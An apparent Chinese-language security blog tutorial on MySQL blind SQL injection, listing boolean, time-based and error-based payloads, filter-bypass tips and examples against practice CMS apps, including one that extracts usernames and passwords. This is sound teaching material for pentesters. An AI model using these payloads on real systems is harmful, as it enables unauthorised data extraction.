@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<link rel="stylesheet" href="/css/custom.css"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SQL 盲注实战总结：布尔、延时与报错注入</title><meta charset="utf-8"><meta name="description" content="Ladder@<!--more--> 一、增删改查（CRUD）基础示例 下面示例展示常见的 SQL 操作（以 `news` 表为例），理解这些语句有助于构造注入 payload： **查询（Read）** SELECT * FROM news WHERE id = $id; **新增（Create）** INSERT INTO news (title, content)"><meta name="author" content="hzhsec">
+<link rel="canonical" href="https://hzhsec.github.io/list/halo_to_publish/sql-blind-injection-techniques/"><meta property="og:title" content="SQL 盲注实战总结：布尔、延时与报错注入" /><meta property="og:description" content="<!--more--> 一、增删改查（CRUD）基础示例 下面示例展示常见的 SQL 操作（以 `news` 表为例），理解这些语句有助于构造注入 payload： **查询（Read）** SELECT * FROM news WHERE id = $id; **新增（Create）** INSERT INTO news (title, content)" />
+<meta property="og:type" content="article" /><meta property="og:url" content="https://hzhsec.github.io/list/halo_to_publish/sql-blind-injection-techniques/" />
+<meta property="article:section" content="list" /><meta property="article:published_time" content="2026-01-08T10:00:00+08:00" /><meta property="article:modified_time" content="2026-01-08T10:00:00+08:00" /><meta name="twitter:card" content="summary"/><meta name="twitter:title" content="SQL 盲注实战总结：布尔、延时与报错注入"/><meta name="twitter:description" content="<!--more--> 一、增删改查（CRUD）基础示例 下面示例展示常见的 SQL 操作（以 `news` 表为例），理解这些语句有助于构造注入 payload： **查询（Read）** SELECT * FROM news WHERE id = $id; **新增（Create）** INSERT INTO news (title, content)"/>
+<link rel="icon" href="/static/hzhsec.png" sizes="16x16"><link rel="apple-touch-icon" href="/static/hzhsec.png"><link rel="manifest" href="/static/hzhsec.png">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" />
+<link rel="stylesheet" href="/css/main.min.ec28f09e946fc0df77c187fcd0d0ebde58fca6de8efb8e1620f3d45c32d4da88.css" crossorigin="anonymous" media="screen" />
+<link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />
+<script src="/js/highlight.min.min.c098d85b5396dec4707ea2cead1445b4dc2ff0fc56b8dbbd9049d0d1c50ad237.js"></script><script>hljs.highlightAll();</script>
+<script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script></head>
+<body><main class="wrapper"><nav class="navigation"><section class="container"><a class="navigation-brand" href="/">主页</a><input type="checkbox" id="menu-toggle" />
+<label class="menu-button float-right" for="menu-toggle"><span></span><span></span><span></span></label><ul class="navigation-list" id="navigation-list">
+<li class="navigation-item navigation-menu"><a class="navigation-link" href="/list/">目录</a></li><li class="navigation-item navigation-menu"><a class="navigation-link" href="/archives/">归档</a></li>
+<li class="navigation-item navigation-menu"><a class="navigation-link" href="/message/">关于</a></li><li class="navigation-item navigation-menu"><a class="navigation-link" href="/categories/">分类</a></li>
+<li class="navigation-item navigation-menu"><a class="navigation-link" href="https://umami-evtq.vercel.app/share/NdRAzdY1AwLB5KF2/hzhsec.github.io">网站统计</a></li><li class="navigation-item menu-separator"><span>|</span></li>
+<li class="navigation-item navigation-social"><a class="navigation-link" href="https://github.com/hzhsec">GitHub</a></li><li class="navigation-item navigation-social"><a class="navigation-link" href="/message/">Mail</a></li></ul></section></nav>
+<div id="content"><article class="blog-single"><header class="blog-title"><h1>SQL 盲注实战总结：布尔、延时与报错注入</h1></header><p><small>January 8, 2026&nbsp;· 882 words&nbsp;· 5 min</small><p><details class="blog-toc" open><summary>Contents</summary><nav id="TableOfContents"><ul><li class="toc-item toc-depth-1"><a class="toc-link" href="#一增删改查crud基础示例">一、增删改查（CRUD）基础示例</a></li><li class="toc-item toc-depth-1"><a class="toc-link" href="#二盲注概念与分类">二、盲注概念与分类</a></li><li class="toc-item toc-depth-1"><a class="toc-link" href="#三布尔盲注常用技巧与示例">三、布尔盲注常用技巧与示例</a></li><li class="toc-item toc-depth-1"><a class="toc-link" href="#四延时盲注示例">四、延时盲注示例</a></li><li class="toc-item toc-depth-1"><a class="toc-link" href="#五报错盲注示例">五、报错盲注示例</a></li><li class="toc-item toc-depth-1"><a class="toc-link" href="#六注入条件判断与测试示例">六、注入条件判断与测试示例</a></li><li class="toc-item toc-depth-1"><a class="toc-link" href="#七cms-案例实战示例">七、CMS 案例（实战示例）</a></li><li class="toc-item toc-depth-1"><a class="toc-link" href="#八小结与检测建议">八、小结与检测建议</a></li><li class="toc-item toc-depth-1"><a class="toc-link" href="#参考资料">参考资料</a></li></ul></nav></details><section class="blog-content"><p>&lt;!--more--&gt;</p>
+<h1 id="一增删改查crud基础示例">一、增删改查（CRUD）基础示例</h1>
+<p>下面示例展示常见的 SQL 操作（以 <code>news</code> 表为例），理解这些语句有助于构造注入 payload：</p>
+<ul><li><strong>查询（Read）</strong></li></ul>
+<div class="highlight"><pre tabindex="0"><code class="language-sql" data-lang="sql">SELECT * FROM news WHERE id = $id;</code></pre></div>
+<ul><li><strong>新增（Create）</strong></li></ul>
+<div class="highlight"><pre tabindex="0"><code class="language-sql" data-lang="sql">INSERT INTO news (title, content) VALUES (&#x27;标题&#x27;, &#x27;内容&#x27;);</code></pre></div>
+<ul><li><strong>删除（Delete）</strong></li></ul>
+<div class="highlight"><pre tabindex="0"><code class="language-sql" data-lang="sql">DELETE FROM news WHERE id = $id;</code></pre></div>
+<ul><li><strong>修改（Update）</strong></li></ul>
+<div class="highlight"><pre tabindex="0"><code class="language-sql" data-lang="sql">UPDATE news SET title = &#x27;新标题&#x27; WHERE id = $id;</code></pre></div>
+<blockquote><p>注：理解后端如何拼接这些语句（是否带引号、是否使用预处理、是否对输入做类型转换）是判断注入可行性的关键。</p></blockquote>
+<hr>
+<h1 id="二盲注概念与分类">二、盲注概念与分类</h1>
+<p><strong>盲注</strong>：当注入无法直接回显数据到页面时，利用页面差异（布尔/时间/报错）逐位或逐条获取信息的技术。常见三类：</p>
+<ol><li><strong>布尔盲注（Boolean-based）</strong></li></ol>
+<ul><li>通过构造条件使页面表现为真或假，从而推断目标信息。</li><li>常用函数：<code>regexp</code>, <code>like</code>, <code>ascii</code>, <code>left</code>, <code>ord</code>, <code>mid</code>, <code>substr</code>。</li></ul>
+<ol><li><strong>延时盲注（Time-based）</strong></li></ol>
+<ul><li>根据 SQL 执行时间判断条件是否成立（<code>SLEEP()</code>、<code>IF()</code>）。</li><li>适用于完全无回显且无法触发错误的情况。</li></ul>
+<ol><li><strong>报错盲注（Error-based）</strong></li></ol>
+<ul><li>利用数据库函数触发可回显的错误信息（<code>updatexml()</code>、<code>extractvalue()</code> 等）。</li><li>需目标环境输出原始错误信息才能有效。</li></ul>
+<hr>
+<h1 id="三布尔盲注常用技巧与示例">三、布尔盲注常用技巧与示例</h1>
+<ul><li>判断数据库名长度：</li></ul>
+<div class="highlight"><pre tabindex="0"><code class="language-sql" data-lang="sql">AND LENGTH(DATABASE()) = 7</code></pre></div>
+<ul><li>判断数据库名第 1 个字符：</li></ul>
+<div class="highlight"><pre tabindex="0"><code class="language-sql" data-lang="sql">AND LEFT(DATABASE(),1) = &#x27;p&#x27;
+-- 或
+AND ORD(LEFT(DATABASE(),1)) = 112</code></pre></div>
+<ul><li>逐字符提取（从第 n 位取 1 个字符）：</li></ul>
+<div class="highlight"><pre tabindex="0"><code class="language-sql" data-lang="sql">AND SUBSTR(DATABASE(), n, 1) = &#x27;x&#x27;</code></pre></div>
+<blockquote><p><code>ORD()</code>/<code>ASCII()</code> 常用于绕过单引号或字符串过滤，用数值比较代替字符串比较。</p></blockquote>
+<hr>
+<h1 id="四延时盲注示例">四、延时盲注示例</h1>
+<ul><li>基础延时：</li></ul>
+<div class="highlight"><pre tabindex="0"><code class="language-sql" data-lang="sql">AND SLEEP(1)</code></pre></div>
+<ul><li>条件触发延时：</li></ul>
+<div class="highlight"><pre tabindex="0"><code class="language-sql" data-lang="sql">AND IF(1=1, SLEEP(5), 0)
+-- 或
+AND IF(ORD(LEFT(DATABASE(),1)) = 107, SLEEP(2), 0)</code></pre></div>
+<p>当请求延迟明显增加时，说明条件成立。</p>
+<hr>
+<h1 id="五报错盲注示例">五、报错盲注示例</h1>
+<ul><li>通过 <code>updatexml()</code> 触发错误并在错误中拼接输出：</li></ul>
+<div class="highlight"><pre tabindex="0"><code class="language-sql" data-lang="sql">AND UPDATEXML(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e), 1)</code></pre></div>
+<ul><li>通过 <code>extractvalue()</code>：</li></ul>
+<div class="highlight"><pre tabindex="0"><code class="language-sql" data-lang="sql">AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)))</code></pre></div>
+<ul><li>在某些 CMS 中可以通过插入/更新导致报错并借报错回显敏感信息：</li></ul>
+<div class="highlight"><pre tabindex="0"><code class="language-sql" data-lang="sql">&#x27;hzk&#x27; OR UPDATEXML(1, CONCAT(0x7e, (SELECT CONCAT_WS(&#x27;-&#x27;, username, password) FROM pikachu.users LIMIT 0,1)), 1) OR &#x27;</code></pre></div>
+<hr>
+<h1 id="六注入条件判断与测试示例">六、注入条件判断与测试示例</h1>
+<p>在检测不同类型注入点时，常见判断语句：</p>
+<ul><li><strong>布尔型检测</strong>（页面只有成功/失败两种输出）</li></ul>
+<div class="highlight"><pre tabindex="0"><code class="language-sql" data-lang="sql">AND LENGTH(DATABASE()) = 6</code></pre></div>
+<ul><li><strong>延时型检测</strong>（通过时间判断）</li></ul>
+<div class="highlight"><pre tabindex="0"><code class="language-sql" data-lang="sql">AND IF(1=1, SLEEP(5), 0)</code></pre></div>
+<ul><li><strong>报错型检测</strong>（依赖报错输出）</li></ul>
+<div class="highlight"><pre tabindex="0"><code class="language-sql" data-lang="sql">AND UPDATEXML(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e), 1)</code></pre></div>
+<p><strong>示例比较（删除接口测试）</strong>：</p>
+<ul><li>删除（延时）：</li></ul>
+<div class="highlight"><pre tabindex="0"><code class="language-sql" data-lang="sql">1 AND IF(1=1, SLEEP(5), 0)</code></pre></div>
+<ul><li>删除（布尔）：</li></ul>
+<div class="highlight"><pre tabindex="0"><code class="language-sql" data-lang="sql">3 AND LENGTH(DATABASE()) = 6  -- 若无回显无法判定</code></pre></div>
+<ul><li>删除（报错）：</li></ul>
+<div class="highlight"><pre tabindex="0"><code class="language-sql" data-lang="sql">4 AND UPDATEXML(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e), 1)</code></pre></div>
+<hr>
+<h1 id="七cms-案例实战示例">七、CMS 案例（实战示例）</h1>
+<ul><li><strong>xhcms 插入报错</strong>：</li></ul>
+<div class="highlight"><pre tabindex="0"><code class="language-" data-lang="">&#x27; AND UPDATEXML(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e), 1) AND &#x27;</code></pre></div>
+<ul><li><strong>kkcms 删除延时</strong>：</li></ul>
+<div class="highlight"><pre tabindex="0"><code class="language-sql" data-lang="sql">AND IF(1=1, SLEEP(5), 0)
+OR IF(1=1, SLEEP(5), 0)
+OR IF(ORD(LEFT(DATABASE(),1)) = 107, SLEEP(2), 0)</code></pre></div>
+<p>这些 payload 在不同 CMS 和不同字段类型上可能需要调整引号、注释符号和编码。</p>
+<hr>
+<h1 id="八小结与检测建议">八、小结与检测建议</h1>
+<ul><li>先判断能否回显（若能，优先用 error-based 或 union-based）；</li><li>无回显优先考虑布尔盲注与延时盲注；</li><li>使用 <code>ORD()</code>/<code>ASCII()</code>、十六进制编码、<code>PREPARE/EXECUTE</code> 等绕过常见过滤；</li><li>在真实渗透中遵循法律与授权范围，避免造成破坏性操作（如任意删除/写入）。</li></ul>
+<hr>
+<h1 id="参考资料">参考资料</h1>
+<ul><li>OWASP SQL Injection Cheat Sheet</li><li>各类 CMS 漏洞实战记录</li></ul></section><div class="paginator"><a class="prev" href="https://hzhsec.github.io/list/halo_to_publish/sql-injection-mysql-practice/"><small>← 上一篇</small><span>SQL 注入实战笔记：枚举、跨库与文件读写（MySQL）</span></a><a class="next" href="https://hzhsec.github.io/list/halo_to_publish/rce-vulnerability-exploitation-bypass-techniques/"><small>下一篇 →</small><span>RCE漏洞全面解析：利用、绕过与无回显攻击技术</span></a></div></article></div><footer class="footer"><p>&copy; 2026 <a href="https://hzhsec.github.io/">Hzhsec home</a> Powered by <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a> <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a></p></footer>
+<a href="#top" class="top-link" id="top-link" accesskey="g">Top</a><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){if(document.body.scrollTop>800||document.documentElement.scrollTop>800){mybutton.style.visibility="visible";mybutton.style.opacity="1";}else{mybutton.style.visibility="hidden";mybutton.style.opacity="0";}};</script>
+<script>document.querySelectorAll('pre > code').forEach((codeblock)=>{const copybutton=document.createElement('button');copybutton.classList.add('copy-code');copybutton.innerHTML='Copy';function done(){copybutton.innerHTML='Copied';setTimeout(()=>{copybutton.innerHTML='Copy';},2000);}copybutton.addEventListener('click',()=>{if('clipboard' in navigator){navigator.clipboard.writeText(codeblock.textContent);done();return;}const range=document.createRange();range.selectNodeContents(codeblock);const selection=window.getSelection();selection.removeAllRanges();selection.addRange(range);try{document.execCommand('copy');done();}catch(e){}selection.removeRange(range);});codeblock.parentNode.appendChild(copybutton);});</script></main></body>
+<script src="/main.min.6bb26b69159420159c74dc9e097b06a578ed2b68c701466a91a44a9632d851bd0af167a1b30012387b4c512b48ad9ad4d3394e04d77ae38d57e1920fe4ed34fe.js" crossorigin="anonymous" defer></script></html>
